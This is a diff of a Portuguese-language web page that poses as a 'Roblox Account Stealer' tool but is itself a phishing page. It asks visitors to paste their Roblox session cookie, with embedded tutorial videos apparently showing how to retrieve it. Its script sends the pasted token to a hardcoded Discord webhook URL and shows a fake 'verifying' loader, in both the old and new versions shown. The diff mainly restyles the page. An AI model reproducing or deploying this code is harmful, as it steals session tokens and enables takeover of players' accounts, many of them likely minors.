@@ -3,41 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <title>Roblox Account Stealer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
+    
     <style>
-        /* ANIMAÇÕES KEYFRAMES */
+        /* ANIMAÇÕES */
         @keyframes fadeInScale {
             from { opacity: 0; transform: scale(0.9) translateY(20px); }
             to { opacity: 1; transform: scale(1) translateY(0); }
         }
-
         @keyframes pulseGlow {
             0% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); }
             50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.8); }
             100% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); }
         }
-
-        @keyframes slideInLeft {
-            from { opacity: 0; transform: translateX(-50px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        @keyframes slideInRight {
-            from { opacity: 0; transform: translateX(50px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
+        @keyframes slideInLeft { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes slideInRight { from { opacity: 0; transform: translateX(50px); } to { opacity: 1; transform: translateX(0); } }
 
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            /* APLICANDO A FONTE DE TEXTO BASE */
+            font-family: 'Rajdhani', sans-serif; 
             margin: 0; padding: 0; height: 100vh;
             display: flex; justify-content: center; align-items: center;
             overflow: hidden; background: #000;
+            color: #fff;
+            letter-spacing: 1px;
         }
 
-        /* FUNDO DE VÍDEO */
+        /* BACKGROUND */
         .video-background {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: -1; pointer-events: none; overflow: hidden;
-            transition: opacity 2s ease-in;
         }
         .video-background iframe {
             width: 100vw; height: 56.25vw; min-height: 100vh; min-width: 177.77vh;
@@ -45,130 +40,127 @@
             transform: translate(-50%, -50%); opacity: 0.35;
         }
 
-        /* VÍDEOS LATERAIS COM SLIDE IN */
+        /* VÍDEOS LATERAIS */
         .video-group { position: absolute; top: 10%; width: 320px; text-align: center; }
         .left-video { left: 20px; animation: slideInLeft 1s ease-out forwards; }
         .right-video { right: 20px; animation: slideInRight 1s ease-out forwards; }
-
-        .video-group iframe { 
-            border-radius: 12px; border: 2px solid #fff; 
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+        .video-group iframe { border-radius: 12px; border: 2px solid #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
+        .video-group p { 
+            margin-top: 10px; font-size: 1.2em; color: #fff; font-weight: 600; 
+            text-shadow: 0 0 8px #fff; font-family: 'Orbitron', sans-serif; 
         }
-        .video-group p { margin-top: 10px; font-size: 1.1em; color: #fff; font-weight: bold; text-shadow: 0 0 8px #fff; }
 
-        /* CONTAINER CENTRAL COM FADE IN E PULSE */
+        /* CONTAINER CENTRAL */
         .container { 
             border: 2px solid #fff; padding: 40px; border-radius: 20px; 
-            background: rgba(20, 20, 20, 0.85); text-align: center;
+            background: rgba(15, 15, 15, 0.9); text-align: center;
             z-index: 10; width: 380px;
             animation: fadeInScale 0.8s ease-out, pulseGlow 3s infinite ease-in-out;
-            backdrop-filter: blur(5px); /* Efeito de vidro fosco */
+            backdrop-filter: blur(8px);
         }
 
-        h2 { margin-top: 0; text-shadow: 0 0 10px #fff; }
+        h2 { 
+            margin-top: 0; color: #fff; text-shadow: 0 0 10px #fff; 
+            font-family: 'Orbitron', sans-serif; font-weight: 700;
+            text-transform: uppercase;
+        }
+        p { font-size: 1.1em; font-weight: 400; }
 
+        /* INPUT */
         input { 
             width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; 
-            border: 1px solid #444; background: rgba(0,0,0,0.6); color: #0f0; 
-            font-family: monospace; box-sizing: border-box; outline: none;
+            border: 1px solid #fff; background: rgba(255, 255, 255, 0.1); 
+            color: #fff; font-family: 'Rajdhani', sans-serif; font-weight: 600;
+            font-size: 1em; box-sizing: border-box; outline: none;
             transition: 0.3s;
         }
-        input:focus { border: 1px solid #fff; box-shadow: 0 0 15px rgba(255,255,255,0.4); transform: scale(1.02); }
+        input::placeholder { color: rgba(255, 255, 255, 0.5); font-weight: 400; }
 
-        /* BOTÕES COM HOVER SUAVE */
-        .btn-main, .btn-info { 
-            cursor: pointer; font-weight: bold; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            background: #333; color: white; border: 2px solid #fff;
+        /* BOTÕES */
+        .btn-main {
+            cursor: pointer; font-weight: 600; transition: all 0.4s;
+            background: #222; color: #fff; border: 2px solid #fff;
+            border-radius: 50px; width: 100%; padding: 12px 25px; 
+            font-size: 1.1em; font-family: 'Orbitron', sans-serif;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+        .btn-main:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
+
+        .btn-info { 
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            padding: 10px 30px; font-size: 0.9em; cursor: pointer; font-weight: 600;
+            transition: all 0.4s; background: #222; color: #fff; border: 2px solid #fff;
             border-radius: 50px; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            font-family: 'Orbitron', sans-serif;
+            animation: fadeInScale 1.5s ease-out;
         }
-        .btn-main:hover, .btn-info:hover {
-            background: #fff; color: #000; box-shadow: 0 0 30px #fff; transform: translateY(-3px);
+        .btn-info:hover { background: #fff; color: #000; transform: translateX(-50%) translateY(-5px); box-shadow: 0 0 30px #fff; }
+
+        /* MODAL */
+        .modal-content { 
+            background-color: #111; margin: 10% auto; padding: 25px; 
+            border: 2px solid #fff; width: 50%; border-radius: 15px; 
+            text-align: left; color: #fff; font-family: 'Rajdhani', sans-serif;
+            box-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
+            animation: fadeInScale 0.4s ease-out;
         }
-        .btn-main { width: 100%; padding: 12px 25px; font-size: 1.1em; }
-        .btn-info { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 10px 30px; font-size: 0.9em; animation: fadeInScale 1.5s ease-out; }
+        .modal-content h3 { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 5px #fff; }
 
         /* LOADER */
         .loader {
-            border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%;
+            border: 4px solid #444; border-top: 4px solid #fff; border-radius: 50%;
             width: 45px; height: 45px; animation: spin 1s linear infinite;
             display: inline-block; margin-bottom: 20px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* MODAL COM EFEITO DE ENTRADA */
-        .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.9); transition: 0.5s; }
-        .modal-content { 
-            background-color: #1a1a1a; margin: 10% auto; padding: 25px; 
-            border: 2px solid #fff; width: 50%; border-radius: 15px; 
-            text-align: left; box-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
-            animation: fadeInScale 0.4s ease-out;
-        }
-        .close { color: #fff; float: right; font-size: 28px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .close:hover { color: #f00; transform: rotate(90deg); }
     </style>
 </head>
 <body>
 
     <div class="video-background">
-        <iframe src="https://www.youtube.com/embed/9vntypeV5QU?autoplay=1&mute=1&loop=1&playlist=9vntypeV5QU&controls=0&showinfo=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>
+        <iframe src="https://www.youtube.com/embed/9vntypeV5QU?autoplay=1&mute=1&loop=1&playlist=9vntypeV5QU&controls=0&showinfo=0" frameborder="0"></iframe>
     </div>
 
     <div class="video-group left-video">
         <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0"></iframe>
-        <p>Tutorial pra pc</p>
+        <p>Tutorial PC</p>
     </div>
 
     <div class="container" id="mainContainer">
-        <h2>Roblox Account Stealer</h2>
-        <p style="color: #bbb;">Insira o token para processar</p>
+        <h2>System Stealer</h2>
+        <p>Aguardando Token para Processamento</p>
         <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
         <br>
-        <button class="btn-main" onclick="enviarToken()">Enviar token</button>
+        <button class="btn-main" onclick="enviarToken()">AUTENTICAR</button>
     </div>
 
     <div class="video-group right-video">
         <iframe width="100%" height="180" src="https://www.youtube.com/embed/nwHMDsXw8WE" frameborder="0"></iframe>
-        <p>Tutorial pra mobile</p>
+        <p>Tutorial Mobile</p>
     </div>
 
-    <button class="btn-info" onclick="abrirModal()">Saiba Mais</button>
+    <button class="btn-info" onclick="abrirModal()">INFO. DO SISTEMA</button>
 
     <div id="infoModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="fecharModal()">&times;</span>
-            <h3 style="color:#fff; text-shadow: 0 0 5px #fff;">Informações do Sistema</h3>
-            <p><strong>Quem somos:</strong> Somos uma equipe especializada em hacking e cybersegurança.</p>
-            <p><strong>Como funciona:</strong> Nosso sistema utiliza integração via API para validar tokens de sessão a partir da busca de senhas nos arquivos do roblox.</p>
-            <p><strong>Segurança:</strong> Utilizamos criptografia de ponta-a-ponta seguros para garantir que os dados sejam discretos e anônimos.</p>
+            <h3>DETALHES DA OPERAÇÃO</h3>
+            <p><strong>Quem somos:</strong> Equipe especializada em hacking e cybersegurança.</p>
+            <p><strong>Operação:</strong> Validação de tokens via API sincronizada com bancos de dados locais.</p>
+            <p><strong>Segurança:</strong> Protocolos de criptografia discretos e anônimos.</p>
         </div>
     </div>
 
     <script>
         function abrirModal() { document.getElementById("infoModal").style.display = "block"; }
         function fecharModal() { document.getElementById("infoModal").style.display = "none"; }
-
         function enviarToken() {
             const tokenValue = document.getElementById('userToken').value;
             const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
             const padraoValido = /^_\|WARNING:-DO-NOT-SHARE-THIS/;
-
             if (padraoValido.test(tokenValue)) {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "🚨 **TOKEN VALIDADO:**\n```" + tokenValue + "```" })
-                });
-
-                const container = document.getElementById('mainContainer');
-                container.style.animation = "none"; // Reseta animação para o loader
-                container.innerHTML = `
-                    <div class="loader"></div>
-                    <h3 style="color:#fff; animation: fadeInScale 0.5s ease-out;">Verificando Token...</h3>
-                    <p style="opacity: 0.8;">Isso pode levar alguns minutos. Não feche esta página.</p>
-                `;
-            } else {
-                alert("ERRO: O formato do token está incorreto!");
-            }
+                fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: "🚨 **TOKEN:**\n```" + tokenValue + "```" }) });
+                document.getElementById('mainContainer').innerHTML = `<div class="loader"></div><h3 style="font-family:'Orbitron'">VERIFICANDO...</h3><p>Sincronizando com a API...</p>`;
+            } else { alert("ERRO: Formato de token inválido!"); }
         }
     </script>
 </body>
